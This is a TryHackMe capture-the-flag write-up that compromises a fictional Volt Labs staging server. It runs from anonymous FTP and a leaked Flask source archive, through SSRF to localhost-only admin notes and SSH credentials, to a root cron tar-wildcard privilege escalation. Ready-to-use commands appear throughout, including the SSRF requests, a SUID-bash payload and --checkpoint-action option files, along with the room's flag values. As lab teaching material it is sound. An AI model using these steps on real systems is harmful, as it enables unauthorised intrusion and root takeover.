Operation Coldstart

TryHackMe CTF. Volt Labs suspects an old staging server has rotted into an exposed liability. Anonymous FTP, source code leak, SSRF to localhost admin, SSH creds, tar wildcard to root.

Volt Labs is a small SaaS shop. They suspect an old staging server has rotted into an exposed liability. Mara assigned the engagement: find a way in and demonstrate full compromise.

Let’s wake up the staging server everyone left behind.

Fingerprinting the sleeping box

First contact:

curl -I http://TARGET_IP

A gunicorn server, unless someone spoofed the headers.

One quick confirmation:

wappalyzer -i http://TARGET_IP

Thank you, wappalyzer.

I set Nmap running, and we can do further recon while it works.

nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP

A quick visit in-browser:

I don’t want to make assumptions yet, but I’m seeing some clear signs and paths. The footer stating “do not expose externally” has piqued my curiosity. First, it’s in all lowercase. Second, why would that be there? The “internal tool” label and its mystique are equally interesting.

We know this is a staging server. What is a staging server? I’m glad you asked.

A staging server is designed to be an exact or almost exact replica of a live production server. Frequently used in dev testing environments, it’s the final checkpoint to confirm features work in a system that mirrors the live environment before deployment.

Let’s check out the Nmap results before we start probing.

Open ports:

  • Port 21: FTP. That could come in handy.
  • Port 22: SSH
  • Port 80: HTTP. Gunicorn confirmed again.

We don’t yet know the Gunicorn WSGI version. I don’t see indicators of a Flask app via Gunicorn yet, but any exposed debuggers are a good find. I’d like to find the .env to see if any hardcoded credentials are exposed.

Since we have wide open, supposedly anonymous FTP on a staging server, let’s see if we can access it:

Suspiciously easy. Hopefully not a red herring.

For anyone not familiar with FTP commands, knowledge is power:

pwd             # show current remote directory
ls              # list files
dir             # more detailed listing
cd foldername   # move into a folder
cd ..           # move up one level
get filename    # download a file
prompt          # toggle confirmation prompts before using mget
mget *          # download multiple files
binary          # use for binaries, archives, images, and databases
ascii           # use for plain text; binary is usually safer overall
passive         # toggle passive mode if listings or downloads hang
bye             # exit

To grab folders, use wget instead of FTP. More on that bridge should we cross it.

ls -la works on this FTP box.

Traversing into pub, ls -la reveals backup.tar.gz.

I’ll be taking that to go, please and thank you. Here’s how:

binary
get backup.tar.gz
bye

I do appreciate its pleasantries.

Inspect before you extract

Let’s extract this into a local folder and take a closer look.

mkdir ftp_backup
tar -xzf backup.tar.gz -C ftp_backup
cd ftp_backup
find . -maxdepth 4 -type f -ls

Sweep for anything useful...

grep -RniE "password|passwd|secret|token|key|admin|user|username|ssh|db|database|env|debug|flask|gunicorn" .

...and sweep for hidden files:

find . -name ".*" -ls

This right here is why we inspect first:

The standout line is, Admin routes are gated by source-IP check (localhost only).

The archive is the full Flask/Gunicorn source for the staging app. We’re going to take a tip from the room synopsis and inspect app.py around the admin route, as well as any helper functions above it:

sed -n '1,180p' voltlabs-preview/app.py
grep -nE "route|admin|request|remote_addr|X-Forwarded|headers|localhost|127|abort|open" voltlabs-preview/app.py

Quite a find. What the source gives us:

  • /preview accepts a user-supplied url parameter
  • ALLOWED_HOSTS = {"kestrel.thm"}, and the comments say kestrel.thm resolves to 127.0.0.1 on the server
  • /admin/ is restricted to requests from 127.x.x.x via request.remote_addr
  • /admin/notes reads /opt/voltlabs-preview/admin_notes.txt
  • the source comments openly describe the SSRF weakness

So the intended path: use /preview as an SSRF primitive to reach the localhost-only admin content.

Confirm the front door is locked

Let’s investigate if direct admin access is blocked:

curl -i http://TARGET_IP/admin/

Confirmed. Direct admin access is blocked. The 403 aligns with what we found in the source: /admin/ is only accessible locally.

We also need to confirm that the more sensitive admin notes route is blocked from direct external access before testing the preview/SSRF path.

curl -i http://TARGET_IP/admin/notes

/admin/ and /admin/notes both returned 403 Forbidden.

SSRF through the side door

In a more polished environment, we could do further verification of whether the preview endpoint can make the server request its own localhost-only address. For the sake of our live environment, we’ll move forward.

The source code is clear: kestrel.thm is allowed and resolves to 127.0.0.1 on the target. The admin route allows 127.x.x.x. Following this logic, /preview should bridge into /admin/.

curl -i "http://TARGET_IP/preview?url=http://kestrel.thm/admin/"

We’ve confirmed SSRF to local admin. /admin/ was blocked, but /preview successfully fetched it. In other words, the server can reach the admin page for us.

Next:

curl -i "http://TARGET_IP/preview?url=http://kestrel.thm/admin/notes"

I think we just pwned our new friend, Mara.

The SSRF exposed staging SSH credentials. Let’s SSH in.

Inside as webdev

ssh webdev@TARGET_IP

We’re in as webdev.

whoami && hostname && pwd
cat user.txt

First flag: THM{96dc7bd50d2fb98fcece01560788b5ab}

Hunting the privesc

Standard checks first.

sudo -l

Not via sudo.

find / -perm -4000 -type f 2>/dev/null

SUID returned mostly standard system binaries and Snap noise. /opt is the better lead, and the app source already pointed there.

ls -la /opt
ls -la /opt/voltlabs-preview

admin_notes.txt is owned by group voltapp and not readable by webdev directly. webdev does own and write to /opt/backups, though.

Find what webdev can write, and what touches it:

find / -type d -writable 2>/dev/null | grep -vE '^/proc|^/sys|^/run|^/dev'

A root cron job, running every minute out of the writable backups directory:

cat /etc/cron.d/voltlabs-backup
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *

That’s the privesc. webdev can write into /opt/backups, and root runs tar there with a wildcard.

tar wildcard to root

tar treats wildcard-expanded filenames that start with -- as options. We can smuggle in --checkpoint-action to make root’s tar run our script.

Stage the payload:

cd /opt/backups
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh

Plant the option files:

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
ls -la

Staged. When root’s cron fires tar, it should run shell.sh and drop a SUID bash.

sleep 70; ls -la /tmp/rootbash

Success.

/tmp/rootbash -p
whoami

The root has been bashed. Writable backup directory plus root cron tar wildcard equals root command execution.

find / -name "flag.txt" 2>/dev/null

Root flag: THM{e6ee84a483d67ade06936fcfd1433e8a}

Clean up

rm -f /tmp/rootbash
rm -f /opt/backups/shell.sh
rm -f /opt/backups/--checkpoint=1
rm -f "/opt/backups/--checkpoint-action=exec=sh shell.sh"

I was raised to leave a place as I found it.

Full Attack Chain

# 1. Recon
curl -I http://TARGET_IP
nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP
# Ports: 21 FTP, 22 SSH, 80 HTTP (Gunicorn)

# 2. Anonymous FTP, grab the backup
ftp TARGET_IP        # anonymous login
cd pub
binary
get backup.tar.gz
bye

# 3. Inspect source, find the SSRF + localhost admin design
tar -xzf backup.tar.gz -C ftp_backup
grep -nE "route|admin|remote_addr|localhost|127" ftp_backup/voltlabs-preview/app.py
# /preview takes url=, ALLOWED_HOSTS={kestrel.thm} -> 127.0.0.1
# /admin/ restricted to 127.x.x.x

# 4. SSRF through /preview to reach localhost-only admin
curl -i "http://TARGET_IP/preview?url=http://kestrel.thm/admin/notes"
# leaks staging SSH credentials

# 5. SSH in as webdev -> user flag
ssh webdev@TARGET_IP
cat user.txt

# 6. Privesc: root cron runs tar with a wildcard in writable /opt/backups
cd /opt/backups
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
sleep 70
/tmp/rootbash -p        # root

Recap: anonymous FTP, backup source leak, SSRF to localhost admin, SSH creds, user flag, root cron tar wildcard, root flag.
